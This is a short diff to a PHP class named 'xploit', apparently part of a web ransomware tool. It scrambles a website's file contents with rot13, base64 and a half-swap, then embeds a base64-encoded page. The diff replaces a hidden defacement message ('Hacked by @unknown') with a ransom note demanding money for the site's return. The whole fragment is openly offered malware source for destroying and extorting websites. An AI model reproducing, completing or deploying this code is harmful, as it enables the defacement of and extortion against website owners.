@@ -12,8 +12,8 @@ class xploit
             $leak = base64_encode(str_rot13($leak));
             $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
         }
-            $pesan  = base64_decode("PHRpdGxlPkN5Ym9yZyB4cGxvaXQgd2FzIGhlcmUgITwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KKnsNCmJhY2tncm91bmQ6I2ZmZjsNCn0NCg0KcCB7DQptYXJnaW46MCAxMDBweDsNCmZvbnQtc2l6ZToxLjV2dzsNCmNvbG9yOiMwMDA7DQp9DQoNCmltZyB7DQp3aWR0aDozMCU7DQp9DQoNCjwvc3R5bGU+DQo8dGFibGUgaGVpZ2h0PSIyNSUiIHdpZHRoPSIxMDAlIj4NCjx0ZCBhbGlnbj0iY2VudGVyIj4NCgk8cD5IYWNrZWQgYnkgPGI+QHVua25vd248L2I+PC9wPg0KPHByZT48Zm9udCBzaXplPSI2Ij4NCg0KIF9fX19fX19fIF9fICAgICBfX19fX18gX19fX19fICAgICAgICAgICAgICAgICAgICAgICANCnwgIHwgIHwgIHwgIHwtLS58ICAgICAgfCAgICAgIHwuLS0tLS0uLS0tLS0uICAgICAgICAgDQp8ICB8ICB8ICB8ICAgICB8fCAgLS0gIHwgIC0tICB8fCAgXyAgfC0tIF9ffF9fIF9fIF9fIA0KfF9fX19fX19ffF9ffF9ffHxfX19fX198X19fX19ffHwgICBfX3xfX19fX3xfX3xfX3xfX3wNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8X198ICAgICAgICAgICAgICAgICAgDQoNCg0KPC9mb250PjwvcHJlPg0KDQoJPHA+SSBoYXZlIDxiPmhpamFja2VkPC9iPiB0aGlzIHNpdGUgYW5kIDxiPmRlc3Ryb3llZDwvYj4gaXQgYmVjYXVzZSB5b3UgZm9yZ290IHRvIHBheSB0YXhlcy48L3A+DQoJPHA+WW91IG5lZWQgdG8gcmVtZW1iZXIgdGhhdCBzbWFydCBwZW9wbGUgYXJlIG1vcmUgYW5ub3lpbmcgdGhhbiBzdHVwaWQgcGVvcGxlLjwvcD4=");
-            $leak   = "<!--#Down#".$leak."--> <title>Yowaimo</title> <em>".$pesan."</em>";
+            $pesan  = base64_decode("PD9waHANCi8vIFJhbnNvbXdhcmUgd2FzIGhlcmUhIQ0KDQplY2hvICI8IWRvY3R5cGUgaHRtbD48aHRtbD48aGVhZD48dGl0bGU+UmFuc29td2FyZSBieSBjeWJvcmcgeHBsb2l0PC90aXRsZT48L2hlYWQ+PHN0eWxlPmJvZHl7IGJhY2tncm91bmQ6IzAwMDsgY29sb3I6IzAwZmYwMDsgdGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6NSU7fSBweyBmb250LXNpemU6MnZ3OyBtYXJnaW46MCAxMHB4O308L3N0eWxlPjxib2R5PjxwPldoMDBweiB5b3VyIHNlY3VyaXR5IGdldCBkb3duISEhPC9wPjxwPkdpdmUgbWUgbW9uZXkgd29ydGggMSB0cmlsbGlvbiBpZiB5b3Ugd2FudCB0aGUgd2Vic2l0ZSB0byBleGlzdCBhZ2Fpbi48L3A+IjsNCg0KPz4=");
+            $leak   = "<!--#We are party at your security#".$leak."--> <title>Yowaimo</title> <em>".$pesan."</em>";
         return $leak;
     }
     public function generate_dec($leak){
